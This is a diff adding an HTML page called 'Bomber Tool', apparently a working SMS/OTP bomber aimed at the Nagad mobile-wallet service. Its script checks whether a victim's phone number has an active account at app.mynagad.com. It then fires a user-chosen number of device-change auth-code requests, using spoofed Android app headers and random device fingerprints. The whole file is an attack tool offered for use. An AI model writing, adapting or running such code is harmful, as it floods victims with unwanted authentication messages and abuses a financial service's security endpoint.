@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bomber Tool</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+        }
+        input {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        pre {
+            text-align: left;
+            white-space: pre-wrap;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Bomber Tool</h1>
+        <form id="bomberForm">
+            <label for="num">Enter Number:</label>
+            <input type="text" id="num" name="num" required>
+            <label for="amt">Enter Limit:</label>
+            <input type="number" id="amt" name="amt" required>
+            <button type="submit">Start</button>
+        </form>
+        <pre id="result"></pre>
+    </div>
+    <script>
+        document.getElementById('bomberForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const num = document.getElementById('num').value;
+            const amt = parseInt(document.getElementById('amt').value, 10);
+
+            if (isNaN(amt)) {
+                displayResult({ error: "Invalid 'amt' parameter." });
+                return;
+            }
+
+            startBomber(num, amt);
+        });
+
+        function startBomber(num, amt) {
+            const urlCheck = `https://app.mynagad.com:20002/api/user/check-user-status-for-log-in?msisdn=${num}`;
+            const urlBomb = "https://app.mynagad.com:20002/api/wallet/generateAuthCode/deviceChange";
+
+            fetch(urlCheck, {
+                method: 'GET',
+                headers: contHeda()
+            })
+            .then(response => response.json())
+            .then(status => {
+                if (status.status === "ACTIVE") {
+                    const uid = status.userId;
+                    let successes = 0;
+                    let failures = 0;
+
+                    for (let i = 0; i < amt; i++) {
+                        fetch(urlBomb, {
+                            method: 'POST',
+                            headers: contHeda({ 'Content-Type': 'application/json; charset=UTF-8' }),
+                            body: JSON.stringify({ userId: uid })
+                        })
+                        .then(response => response.json())
+                        .then(result => {
+                            if (result.executionStatus && result.executionStatus.statusType === "EXECUTED_SUCCESS") {
+                                successes++;
+                            } else {
+                                failures++;
+                            }
+
+                            if (i === amt - 1) {
+                                displayResult({
+                                    Status: `success - ${successes} & fail - ${failures}`,
+                                    num: num,
+                                    amt: amt,
+                                    Credit: "TEAM DCCS"
+                                });
+                            }
+                        })
+                        .catch(() => failures++);
+                    }
+                } else {
+                    displayResult({ error: "NaGad account is not active." });
+                }
+            })
+            .catch(() => displayResult({ error: "Failed to check user status." }));
+        }
+
+        function contHeda(extraHeaders = {}) {
+            return {
+                'User-Agent': 'okhttp/3.14.9',
+                'Connection': 'Keep-Alive',
+                'Accept-Encoding': 'gzip',
+                'X-KM-UserId': 'None',
+                'X-KM-User-AspId': '100012345612345',
+                'X-KM-User-Agent': 'ANDROID/1152',
+                'X-KM-DEVICE-FGP': generateDeviceFgp(),
+                'X-KM-Accept-language': 'bn',
+                'X-KM-AppCode': '01',
+                ...extraHeaders
+            };
+        }
+
+        function generateDeviceFgp() {
+            const chars = '0123456789ABCDEF';
+            return Array.from({ length: 32 }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
+        }
+
+        function displayResult(result) {
+            document.getElementById('result').textContent = JSON.stringify(result, null, 4);
+        }
+    </script>
+</body>
+</html>
